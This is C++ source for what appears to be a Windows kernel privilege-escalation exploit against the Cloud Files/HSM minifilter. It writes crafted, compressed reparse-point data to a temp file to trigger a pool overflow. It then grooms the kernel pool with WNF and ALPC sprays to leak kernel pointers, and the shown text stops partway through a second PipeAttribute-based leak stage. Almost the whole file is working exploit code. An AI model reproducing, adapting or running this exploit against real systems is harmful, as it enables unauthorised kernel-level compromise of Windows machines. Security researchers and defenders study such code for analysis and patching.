#include <stdio.h> 
#include <stdlib.h> 
#include <string.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <atlstr.h>
#include <cfapi.h>
#include <sddl.h>
#include <tlhelp32.h>
#include <vector>
#include "header.h"

using namespace std;

#pragma comment(lib, "CldApi.lib") 
#pragma comment(lib,"kernel32.lib")

CString SyncRoot = L"c:\\windows\\temp\\";

typedef NTSTATUS(__stdcall* fpRtlDecompressBuffer)(USHORT, PUCHAR, ULONG, PUCHAR, ULONG, PULONG);
typedef NTSTATUS(__stdcall* fpRtlCompressBuffer)(USHORT, PUCHAR, ULONG, PUCHAR, ULONG, ULONG, PULONG, PVOID);
typedef NTSTATUS(__stdcall* fpRtlGetCompressionWorkSpaceSize)(USHORT, PULONG, PULONG);

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
fpRtlDecompressBuffer RtlDecompressBuffer = (fpRtlDecompressBuffer)GetProcAddress(ntdll, "RtlDecompressBuffer");
fpRtlCompressBuffer RtlCompressBuffer = (fpRtlCompressBuffer)GetProcAddress(ntdll, "RtlCompressBuffer");
fpRtlGetCompressionWorkSpaceSize RtlGetCompressionWorkSpaceSize = (fpRtlGetCompressionWorkSpaceSize)GetProcAddress(ntdll, "RtlGetCompressionWorkSpaceSize");
fNtCreateWnfStateName pNtCreateWnfStateName = (fNtCreateWnfStateName)(GetProcAddress(ntdll, "NtCreateWnfStateName"));
fNtUpdateWnfStateData pNtUpdateWnfStateData = (fNtUpdateWnfStateData)(GetProcAddress(ntdll, "NtUpdateWnfStateData"));
fNtDeleteWnfStateData pNtDeleteWnfStateData = (fNtDeleteWnfStateData)(GetProcAddress(ntdll, "NtDeleteWnfStateData"));
fNtQueryWnfStateData pNtQueryWnfStateData = (fNtQueryWnfStateData)(GetProcAddress(ntdll, "NtQueryWnfStateData"));
fNtDeleteWnfStateName pNtDeleteWnfStateName = (fNtDeleteWnfStateName)(GetProcAddress(ntdll, "NtDeleteWnfStateName"));
fNtFsControlFile pNtFsControlFile = (fNtFsControlFile)(GetProcAddress(ntdll, "NtFsControlFile"));
fpNtAlpcCreatePort pNtAlpcCreatePort = (fpNtAlpcCreatePort)GetProcAddress(ntdll, "NtAlpcCreatePort");
fpNtAlpcCreateResourceReserve pNtAlpcCreateResourceReserve = (fpNtAlpcCreateResourceReserve)GetProcAddress(ntdll, "NtAlpcCreateResourceReserve");
fpNtAlpcSendWaitReceivePort pNtAlpcSendWaitReceivePort = (fpNtAlpcSendWaitReceivePort)GetProcAddress(ntdll, "NtAlpcSendWaitReceivePort");

// CRC32 STUFF
/* CRC polynomial 0xedb88320 */
// https://github.com/sherpya/nloader/blob/master/libs/ntdll/crc32.c
static const DWORD CRC_table[256] =
{
    0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419, 0x706af48f,
    0xe963a535, 0x9e6495a3, 0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988,
    0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91, 0x1db71064, 0x6ab020f2,
    0xf3b97148, 0x84be41de, 0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7,
    0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec, 0x14015c4f, 0x63066cd9,
    0xfa0f3d63, 0x8d080df5, 0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172,
    0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b, 0x35b5a8fa, 0x42b2986c,
    0xdbbbc9d6, 0xacbcf940, 0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59,
    0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116, 0x21b4f4b5, 0x56b3c423,
    0xcfba9599, 0xb8bda50f, 0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924,
    0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d, 0x76dc4190, 0x01db7106,
    0x98d220bc, 0xefd5102a, 0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433,
    0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818, 0x7f6a0dbb, 0x086d3d2d,
    0x91646c97, 0xe6635c01, 0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e,
    0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457, 0x65b0d9c6, 0x12b7e950,
    0x8bbeb8ea, 0xfcb9887c, 0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65,
    0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2, 0x4adfa541, 0x3dd895d7,
    0xa4d1c46d, 0xd3d6f4fb, 0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0,
    0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9, 0x5005713c, 0x270241aa,
    0xbe0b1010, 0xc90c2086, 0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,
    0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4, 0x59b33d17, 0x2eb40d81,
    0xb7bd5c3b, 0xc0ba6cad, 0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a,
    0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683, 0xe3630b12, 0x94643b84,
    0x0d6d6a3e, 0x7a6a5aa8, 0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1,
    0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe, 0xf762575d, 0x806567cb,
    0x196c3671, 0x6e6b06e7, 0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc,
    0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5, 0xd6d6a3e8, 0xa1d1937e,
    0x38d8c2c4, 0x4fdff252, 0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b,
    0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60, 0xdf60efc3, 0xa867df55,
    0x316e8eef, 0x4669be79, 0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236,
    0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f, 0xc5ba3bbe, 0xb2bd0b28,
    0x2bb45a92, 0x5cb36a04, 0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d,
    0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a, 0x9c0906a9, 0xeb0e363f,
    0x72076785, 0x05005713, 0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38,
    0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21, 0x86d3d2d4, 0xf1d4e242,
    0x68ddb3f8, 0x1fda836e, 0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777,
    0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c, 0x8f659eff, 0xf862ae69,
    0x616bffd3, 0x166ccf45, 0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2,
    0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db, 0xaed16a4a, 0xd9d65adc,
    0x40df0b66, 0x37d83bf0, 0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,
    0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6, 0xbad03605, 0xcdd70693,
    0x54de5729, 0x23d967bf, 0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94,
    0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d
};

DWORD ComputeCrc32(DWORD initial, const BYTE* data, DWORD length) {
    DWORD crc = ~initial;
    while (length-- > 0) {
        crc = CRC_table[(crc ^ *data++) & 0xff] ^ (crc >> 8);
    }
    return ~crc;
}

void DumpHex(const char* data, unsigned long long size) {
    char ascii[17];
    unsigned long long i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        }
        else {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size) {
            printf(" ");
            if ((i + 1) % 16 == 0) {
                printf("|  %s \n", ascii);
            }
            else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i + 1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}

void SetBufferCrc32(PHSM_REPARSE_DATA pBuffer, DWORD bufferSize) {
    // CRC32 is calculated from offset 0xC (after Magic and Crc32 fields)
    pBuffer->FileData.Crc32 = ComputeCrc32(0, (BYTE*)pBuffer + 0xC, bufferSize - 0xC);
    pBuffer->FileData.Flags |= 0x2; // Set CRC32 flag
}

DWORD CalculateBufferSize(PHSM_REPARSE_DATA info, int elementCount) {
    unsigned short maximal = 0;
    for (int i = 0; i < elementCount; i++) {
        unsigned short endOffset = info->FileData.ElementInfos[i].Length + info->FileData.ElementInfos[i].Offset;
        if (endOffset > maximal) {
            maximal = endOffset;
        }
    }
    return maximal + 4;
}

int BuildOverflow(HANDLE hFile, int PayloadSize, char* PayloadBuf) {

    // =================================================================
    // 1. Build BtRp buffer
    // =================================================================
    BYTE BtRp_Buffer[0x4000] = { 0 };
    PHSM_REPARSE_DATA pBtRp_Data = (PHSM_REPARSE_DATA)BtRp_Buffer;
    pBtRp_Data->FileData.Magic = 0x70527442; // "BtRp"
    pBtRp_Data->FileData.NumberOfElements = 0x5;
    pBtRp_Data->FileData.Flags = 0x2; // Crc32 exists

    pBtRp_Data->FileData.ElementInfos[0].Type = 0x7;
    pBtRp_Data->FileData.ElementInfos[0].Length = 0x1;
    pBtRp_Data->FileData.ElementInfos[0].Offset = 0x60;

    pBtRp_Data->FileData.ElementInfos[1].Type = 0x7;
    pBtRp_Data->FileData.ElementInfos[1].Length = 0x1;
    pBtRp_Data->FileData.ElementInfos[1].Offset = 0x64;

    pBtRp_Data->FileData.ElementInfos[2].Type = 0x7;
    pBtRp_Data->FileData.ElementInfos[2].Length = 0x1;
    pBtRp_Data->FileData.ElementInfos[2].Offset = 0x68;

    pBtRp_Data->FileData.ElementInfos[3].Type = 0x6;
    pBtRp_Data->FileData.ElementInfos[3].Length = 0x8;
    pBtRp_Data->FileData.ElementInfos[3].Offset = 0x6C;

    pBtRp_Data->FileData.ElementInfos[4].Type = 0x11; // Call the vulnerable memcpy/memmove
    pBtRp_Data->FileData.ElementInfos[4].Length = PayloadSize;
    pBtRp_Data->FileData.ElementInfos[4].Offset = 0x78;

    *(BYTE*)(BtRp_Buffer + 0x4 + 0x60) = 0x01;  // Bt0 value
    *(BYTE*)(BtRp_Buffer + 0x4 + 0x64) = 0x10;  // Bt1 value
    *(BYTE*)(BtRp_Buffer + 0x4 + 0x68) = 0x00;  // Bt2 value
    memset(BtRp_Buffer + 0x4 + 0x6C, 0x00, 8);  // Bt3 value
    memcpy(BtRp_Buffer + 0x4 + 0x78, PayloadBuf, PayloadSize);  // Bt4 payload

    // Calculate BtRp total size
    DWORD BtRpSize = CalculateBufferSize(pBtRp_Data, 5);
    BtRpSize = (BtRpSize + 7) & ~7;  // Align to 8 bytes
    printf("[+] BtRp Size: 0x%lx\n", BtRpSize);

    // Set BtRp buffer length
    pBtRp_Data->FileData.Length = BtRpSize - 4;

    SetBufferCrc32(pBtRp_Data, BtRpSize);

   // =================================================================
   // 2. Build FeRp buffer
   // =================================================================
    BYTE FeRp_Buffer[0x4000] = {0};
    PHSM_REPARSE_DATA pFeRp_Data = (PHSM_REPARSE_DATA)FeRp_Buffer;
    
    // Set FeRp header
    pFeRp_Data->FileData.Magic = 0x70526546;  // "FeRp"
    pFeRp_Data->FileData.NumberOfElements = 0xA;
    pFeRp_Data->FileData.Flags = 0x2; // Crc32 exists

    // Configure element headers
    pFeRp_Data->FileData.ElementInfos[0].Type = 0x7;
    pFeRp_Data->FileData.ElementInfos[0].Length = 0x1;
    pFeRp_Data->FileData.ElementInfos[0].Offset = 0x60;
    
    pFeRp_Data->FileData.ElementInfos[1].Type = 0xA;
    pFeRp_Data->FileData.ElementInfos[1].Length = 0x4;
    pFeRp_Data->FileData.ElementInfos[1].Offset = 0x64;
    
    pFeRp_Data->FileData.ElementInfos[2].Type = 0x6;
    pFeRp_Data->FileData.ElementInfos[2].Length = 0x8;
    pFeRp_Data->FileData.ElementInfos[2].Offset = 0x6C;
    
    pFeRp_Data->FileData.ElementInfos[3].Type = 0x11;
    pFeRp_Data->FileData.ElementInfos[3].Length = 0x4;
    pFeRp_Data->FileData.ElementInfos[3].Offset = 0x68;
    
    pFeRp_Data->FileData.ElementInfos[4].Type = 0x11;               // Call to HsmIBitmapNORMALOpen()
    pFeRp_Data->FileData.ElementInfos[4].Length = pBtRp_Data->FileData.Length;
    pFeRp_Data->FileData.ElementInfos[4].Offset = 0x78;

    *(BYTE*)(FeRp_Buffer + 0x4 + 0x60) = 0x1;                 // Fe0 value
    *(DWORD*)(FeRp_Buffer + 0x4 + 0x64) = 0x00000040;         // Fe1 value
    *(DWORD*)(FeRp_Buffer + 0x4 + 0x68) = 0x3;                // Fe3 value
    memset(FeRp_Buffer + 0x4 + 0x6C, 0x41, 4);                // Fe2 value
    memcpy(FeRp_Buffer + 0x78, BtRp_Buffer, BtRpSize);  // Fe4 contains BtRp

    // Calculate FeRp total size
    DWORD FeRpSize = CalculateBufferSize(pFeRp_Data, 10);
    FeRpSize = (FeRpSize + 7) & ~7;  // Align to 8 bytes
    printf("[+] FeRp Size: 0x%lx\n", FeRpSize);

    // Set FeRp buffer length
    pFeRp_Data->Length = FeRpSize;
    pFeRp_Data->Flags = 1;  // Uncompressed flag
    pFeRp_Data->FileData.Length = FeRpSize - 0x4;

    SetBufferCrc32(pFeRp_Data, FeRpSize);

    // DumpHex((const char*)FeRp_Buffer, FeRpSize);

    // =================================================================
    // 3. Compress FeRp buffer
    // =================================================================
    BYTE CompressedBuffer[0x1000] = { 0 };
    ULONG CompressedSize = 0;

    // Get compression workspace size
    ULONG BufferWorkSpaceSize = 0;
    ULONG FragmentWorkSpaceSize = 0;
    RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_LZNT1,
        &BufferWorkSpaceSize,
        &FragmentWorkSpaceSize);

    // Allocate workspace
    PVOID WorkSpace = malloc(BufferWorkSpaceSize);
    if (!WorkSpace) {
        printf("Memory allocation failed\n");
        return -1;
    }

    // Compress the buffer (skip first 4 bytes)
    NTSTATUS status = RtlCompressBuffer(
        COMPRESSION_FORMAT_LZNT1,
        FeRp_Buffer + 4,                // Skip header
        FeRpSize - 4,                   // Size without header
        CompressedBuffer + 4,           // Output after header
        sizeof(CompressedBuffer) - 4,
        4096,                           // Chunk size
        &CompressedSize,
        WorkSpace
    );

    free(WorkSpace);

    if (!NT_SUCCESS(status)) {
        printf("Compression failed: 0x%X\n", status);
        return -1;
    }

    // Set compression header
    *(USHORT*)(CompressedBuffer) = 0x8001;        // Compression flag
    *(USHORT*)(CompressedBuffer + 2) = FeRpSize;  // Uncompressed size
    CompressedSize += 4;  // Include header size

   // =================================================================
   // 4. Set reparse point
   // =================================================================
    REPARSE_DATA_BUFFER_EX reparseData = { 0 };
    reparseData.Flags = 0x1;
    reparseData.ExistingReparseTag = 0x9000601A;
    reparseData.ReparseDataBuffer.ReparseTag = 0x9000601A;
    reparseData.ReparseDataBuffer.ReparseDataLength = CompressedSize;

    memcpy(reparseData.ReparseDataBuffer.RpBuf,
        CompressedBuffer,
        CompressedSize);

    DWORD bytesReturned;
    BOOL success = DeviceIoControl(
        hFile,
        FSCTL_SET_REPARSE_POINT_EX,
        &reparseData,
        sizeof(REPARSE_DATA_BUFFER_EX) + CompressedSize - sizeof(reparseData.ReparseDataBuffer.RpBuf),
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    if (!success) {
        printf("[-] SetReparse failed: %d\n", GetLastError());
        return -1;
    }

    return 0;
}


int main(void) 
{

    // Step 1: Registering a sync root using the Cloud Filter API

    ifstream fs;
    ofstream fsTarget;
    DWORD SourceFileSize = 0;
    CF_CONNECTION_KEY key = { 0 };
    HRESULT hRet = S_OK;
    HANDLE hFile;
    BOOL bRet;
    int ret = 0;

    CF_SYNC_REGISTRATION CfSyncRegistration = { 0 };
    CfSyncRegistration.StructSize = sizeof(CF_SYNC_REGISTRATION);
    CfSyncRegistration.ProviderName = L"FFE4";
    CfSyncRegistration.ProviderVersion = L"1.0";
    CfSyncRegistration.ProviderId = { 0xf4d808a4, 0xa493, 0x4703, { 0xa8, 0xb8, 0xe2, 0x6a, 0x7, 0x7a, 0xd7, 0x3b } };

    CF_SYNC_POLICIES CfSyncPolicies = { 0 };
    CfSyncPolicies.StructSize = sizeof(CF_SYNC_POLICIES);
    CfSyncPolicies.HardLink = CF_HARDLINK_POLICY_ALLOWED;
    CfSyncPolicies.Hydration.Primary = CF_HYDRATION_POLICY_FULL;
    CfSyncPolicies.InSync = CF_INSYNC_POLICY_NONE;
    CfSyncPolicies.Population.Primary = CF_POPULATION_POLICY_PARTIAL;
    CfSyncPolicies.PlaceholderManagement = CF_PLACEHOLDER_MANAGEMENT_POLICY_UPDATE_UNRESTRICTED;

    hRet = CfRegisterSyncRoot(SyncRoot, &CfSyncRegistration, &CfSyncPolicies, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
    if (!SUCCEEDED(hRet)) {
        CfUnregisterSyncRoot(SyncRoot);
        printf("[-] CfRegisterSyncRoot failed: %d\n", GetLastError());
        return -1;
    }
    printf("[+] CfRegisterSyncRoot successfully registered a sync root!\n");

    HANDLE hFile1;
    srand((unsigned)time(NULL) ^ GetTickCount64());  // Seed the RNG  // Seed the RNG
    int randomNum = (rand() << 16) | rand();  // ensures a 5-digit number (10000-99999)
    CString XplFile;
    XplFile.Format(L"c:\\windows\\temp\\xpl_%d", randomNum);

    printf("[+] Creating a new file for malicious reparse data: %S\n", XplFile.GetBuffer());
    hFile1 = CreateFile(XplFile, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile1 == INVALID_HANDLE_VALUE) {
        printf("[-] Open file failed: %d, file already exist?\n", GetLastError());
        return -1;
    } else {
        printf("[+] Handle of the file: %p\n", hFile1);
    }

    // Step 2: Creating malicious "FeRp"
    char Bit_4_Buf[0x4000];
    memset(Bit_4_Buf, 0x0, sizeof(Bit_4_Buf));
    memset(Bit_4_Buf, 0x41, 0x1000); // Fill 0x1000 bytes of the allocated pool with tag HsBm 
    *(DWORD64*)(Bit_4_Buf + 0x1000) = 0x00100904; // WNF_STATE_DATA.Header
    *(DWORD64*)(Bit_4_Buf + 0x1004) = 0xff8; // WNF_STATE_DATA.AllocatedSize
    *(DWORD64*)(Bit_4_Buf + 0x1008) = 0xff8; // WNF_STATE_DATA.DataSize
    *(DWORD64*)(Bit_4_Buf + 0x100c) = 0xd3ad; // WNF_STATE_DATA.ChangeStamp
    BuildOverflow(hFile1, 0x1010, Bit_4_Buf);

    printf("[+] Closing the file\n");
    CloseHandle(hFile1);

    // Step 3: Setting up Pool

    printf("[+] Creating ALPC ports\n");

    #define NUM_ALPC 0x800
    HANDLE pcPorts[NUM_ALPC];
    CONST UINT portsCount = NUM_ALPC;

    ALPC_PORT_ATTRIBUTES serverPortAttr;
    OBJECT_ATTRIBUTES    oaPort;
    HANDLE               hPort;
    NTSTATUS             ntRet;
    UNICODE_STRING       usPortName;
    WCHAR				 wszPortName[64];

    CONST WCHAR g_wszPortPrefix[] = L"MyPort";
    HANDLE g_hResource = NULL;
    for (UINT i = 0; i < portsCount; i++) {
        swprintf_s(wszPortName, sizeof(wszPortName) / sizeof(WCHAR), L"\\RPC Control\\%s%d", g_wszPortPrefix, i);
        RtlInitUnicodeString(&usPortName, wszPortName);
        InitializeObjectAttributes(&oaPort, &usPortName, 0, 0, 0);
        RtlSecureZeroMemory(&serverPortAttr, sizeof(serverPortAttr));
        serverPortAttr.MaxMessageLength = MAX_MSG_LEN;
        ntRet = pNtAlpcCreatePort(&pcPorts[i], &oaPort, &serverPortAttr);
        if (!SUCCEEDED(ntRet)) {
            printf("[-] Something went wrong in creating ALPC handles!\n");
            return 1;
        }
    }

    SECURITY_DESCRIPTOR sd_spraying = { 0 };
    InitializeSecurityDescriptor(&sd_spraying, SECURITY_DESCRIPTOR_REVISION);

    #define SPRAY_ONE_PAD 0x3000
    #define SPRAY_ONE_MAL 0x500

    std::vector<WNF_STATE_NAME> spray1_pad(SPRAY_ONE_PAD);
    std::vector<WNF_STATE_NAME> spray1_mal(SPRAY_ONE_MAL);

    SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

    unsigned char* buffer = new unsigned char[0x1000];
    memset(buffer, 'C', sizeof(buffer));

    /// Spraying 1: Fill the pages with WNF_STATE_DATA
    printf("[+] Phase I: Performing Defragmentation for the object....\n");
    for (int i = 0; i < SPRAY_ONE_PAD; i++) {
        pNtCreateWnfStateName(&(spray1_pad[i]), WnfTemporaryStateName, WnfDataScopeMachine, FALSE, 0, 0x1000, &sd_spraying);
        pNtUpdateWnfStateData(&(spray1_pad[i]), buffer, (0x1000 - 0x10), 0, 0, 0, 0); // 0x10 is sizeof(WNF_STATE_DATA)
    }

    /// Spraying 2: Filling new page with WNF_STATE_DATA
    printf("[+] Phase II: Allocating objects in sequence....\n");
    for (int i = 0; i < SPRAY_ONE_MAL; i++) {

        pNtCreateWnfStateName(&(spray1_mal[i]), WnfTemporaryStateName, WnfDataScopeMachine, FALSE, 0, 0x1000, &sd_spraying);
        pNtUpdateWnfStateData(&(spray1_mal[i]), buffer, (0x1000 - 0x10), 0, 0, 0, 0);
    }

    Sleep(1000);

    /// Creating holes
    printf("[+] Phase III: Creating holes in the pool...\n");
    for (int i = 0; i < SPRAY_ONE_MAL; i = i + 2) {
        pNtDeleteWnfStateData(&(spray1_mal[i]), NULL);
    }

    printf("[+] Opening the file to trigger the vulnerability\n");
    hFile1 = 0;
    hFile1 = CreateFile(XplFile, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile1 == INVALID_HANDLE_VALUE) {
        printf("[-] Open file failed: %d\n", GetLastError());
        return -1;
    }

    CONST ULONG poolAlHaSize = 0x1010; // ALPC port handle table
    CONST ULONG reservesCount = (poolAlHaSize / 2) / sizeof(ULONG_PTR) + 1;

    printf("[+] Allocating ALPC reserve handles\n");
    HANDLE hResource;

    for (UINT i = 0; i < portsCount; i++) {
        hPort = pcPorts[i];
        for (UINT j = 0; j < reservesCount; j++) {
            ntRet = pNtAlpcCreateResourceReserve(hPort, 0, 0x28, &hResource);
            if (!SUCCEEDED(ntRet)) {
                printf("[-] Something went wrong in allocating ALPC handles!\n");
                return 1;
            }
            if (g_hResource == NULL) {	// save only the very first
                g_hResource = hResource;
            }
        }
    }

    printf("[+] Waiting...\n");
    Sleep(5000);

    // Step 4: Leaking KALPC_RESERVE pointer

    WNF_CHANGE_STAMP stamp;
    char WNFOutput[0x2000];
    unsigned long WNFOutputSize = 0x1000;
    int CorruptedWNFidx = -1;
    NTSTATUS state = 0;
    unsigned long long ALPC_leak = 0;
    printf("[+] Finding corrupted WNF_STATE_DATA object\n");
    for (int i = 1; i < SPRAY_ONE_MAL; i = i + 2) {
        memset(WNFOutput, 0x0, sizeof(WNFOutput));
        WNFOutputSize = 0x1000;
        state = pNtQueryWnfStateData(&spray1_mal[i], NULL, NULL, &stamp, WNFOutput, &WNFOutputSize);
        if (stamp == 0xd3ad) {
            printf("[+] Found corrupted WNF object; index: %d, stamp: 0x%lx, state: 0x%lx\n", i, stamp, state);
            CorruptedWNFidx = i;
            ALPC_leak = *((unsigned long long*)(WNFOutput + 0xff0));
            printf("[+] KALPC_RESERVE leaked address: 0x%llx\n", ALPC_leak);
            break;
        }
    }
    if (CorruptedWNFidx == -1 || ALPC_leak == 0) {
        printf("[!] Unable to find corrupted object\n");
        Sleep(5000);
        return 1;
    }

    // Step 5: Creating another malicious reparse data for PipeAttribute

    HANDLE hFile2;
    srand((unsigned)time(NULL) ^ GetTickCount64());  // Seed the RNG
    int randomNum2 = (rand() << 16) | rand();  // ensures a 5-digit number (10000-99999)
    CString XplFile2;
    XplFile2.Format(L"c:\\windows\\temp\\xpl_%d", randomNum2);

    printf("[+] Creating an another new file for malicious reparse data: %S\n", XplFile2.GetBuffer());
    hFile2 = CreateFile(XplFile2, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile2 == INVALID_HANDLE_VALUE) {
        printf("[-] Open file failed: %d, file already exist?\n", GetLastError());
        return -1;
    }
    else {
        printf("[+] Handle of the second file: %p\n", hFile2);
    }

    memset(Bit_4_Buf, 0x0, sizeof(Bit_4_Buf));
    memset(Bit_4_Buf, 0x42, 0x1000); // Fill 0x1000 bytes of the allocated pool with tag HsBm 
    *(DWORD64*)(Bit_4_Buf + 0x1000) = 0x00100904; // WNF_STATE_DATA.Header
    *(DWORD64*)(Bit_4_Buf + 0x1004) = 0xff8; // WNF_STATE_DATA.AllocatedSize
    *(DWORD64*)(Bit_4_Buf + 0x1008) = 0xff8; // WNF_STATE_DATA.DataSize
    *(DWORD64*)(Bit_4_Buf + 0x100c) = 0xbeef; // WNF_STATE_DATA.ChangeStamp
    BuildOverflow(hFile2, 0x1010, Bit_4_Buf);

    printf("[+] Closing the file\n");
    CloseHandle(hFile2);

    // Step 6: Setting up Pool 2nd time

    #define PIPE_COUNT 0x450

    std::vector<HANDLE> pRead(PIPE_COUNT);
    std::vector<HANDLE> pWrite(PIPE_COUNT);

    printf("[+] Creating anonymous pipe objects\n");
    for (int i = 0; i < PIPE_COUNT; i++) {
        if (!CreatePipe(&pRead[i], &pWrite[i], NULL, NULL)) {
            printf("[-] CreatePipe failed with error %d", GetLastError());
        }
    }

    #define SPRAY_TWO_PAD 0x1000
    #define SPRAY_TWO_MAL 0x400

    std::vector<WNF_STATE_NAME> spray2_pad(SPRAY_TWO_PAD);
    std::vector<WNF_STATE_NAME> spray2_mal(SPRAY_TWO_MAL);

    SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

    unsigned char* buffer_2 = new unsigned char[0x1000];
    memset(buffer_2, 'D', sizeof(buffer_2));

    /// Spraying 1: Fill the pages with WNF_STATE_DATA
    printf("[+] Phase I: Performing Defragmentation for the object....\n");
    for (int i = 0; i < SPRAY_TWO_PAD; i++) {
        pNtCreateWnfStateName(&(spray2_pad[i]), WnfTemporaryStateName, WnfDataScopeMachine, FALSE, 0, 0x1000, &sd_spraying);
        pNtUpdateWnfStateData(&(spray2_pad[i]), buffer_2, (0x1000 - 0x10), 0, 0, 0, 0); // 0x10 is sizeof(WNF_STATE_DATA)
    }

    /// Spraying 2: Filling new page with WNF_STATE_DATA
    printf("[+] Phase II: Allocating objects in sequence....\n");
    for (int i = 0; i < SPRAY_TWO_MAL; i++) {

        pNtCreateWnfStateName(&(spray2_mal[i]), WnfTemporaryStateName, WnfDataScopeMachine, FALSE, 0, 0x1000, &sd_spraying);
        pNtUpdateWnfStateData(&(spray2_mal[i]), buffer_2, (0x1000 - 0x10), 0, 0, 0, 0);
    }

    Sleep(1000);

    /// Creating holes
    printf("[+] Phase III: Creating holes in the pool...\n");
    for (int i = 0; i < SPRAY_TWO_MAL; i = i + 2) {
        pNtDeleteWnfStateData(&(spray2_mal[i]), NULL);
    }

    Sleep(1000);

    printf("[+] Opening the second file to trigger the vulnerability\n");
    hFile2 = 0;
    hFile2 = CreateFile(XplFile2, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile2 == INVALID_HANDLE_VALUE) {
        printf("[-] Open file failed: %d\n", GetLastError());
        return -1;
    }

    char PipeData[0x1000];
    char PipeOutput[0x1000];
    IO_STATUS_BLOCK pipe_status;
    memset(PipeData, 0x0, sizeof(PipeData));
    memset(PipeOutput, 0x0, sizeof(PipeOutput));
    memset(PipeData, 0x43, 0x60);
    printf("[+] Spraying PipeAttribute..\n");
    for (int i = 0; i < PIPE_COUNT; i++) {
        NTSTATUS stat = pNtFsControlFile(pWrite[i],
            NULL,
            NULL,
            NULL,
            &pipe_status,
            0x11003C,
            PipeData,
            (0x1000 - 0x30), 
            PipeOutput, 
            0x100
        );
        if (stat != 0) {
            printf("[-] NtFsControlFile failed with error 0x%lx\n", stat);
        }
    }

    printf("[+] Waiting...\n");
    Sleep(5000);

    // Step 6: Leaking PipeAttribute.Flink pointer

    WNF_CHANGE_STAMP stamp_pipe;
    char WNFOutput_Pipe[0x2000];
    unsigned long WNFOutputSize_Pipe = 0x1000;
    int CorruptedWNFidx_Pipe = -1;
    state = 0;
    unsigned long long Pipe_leak = 0;
    printf("[+] Finding corrupted WNF_STATE_DATA object\n");
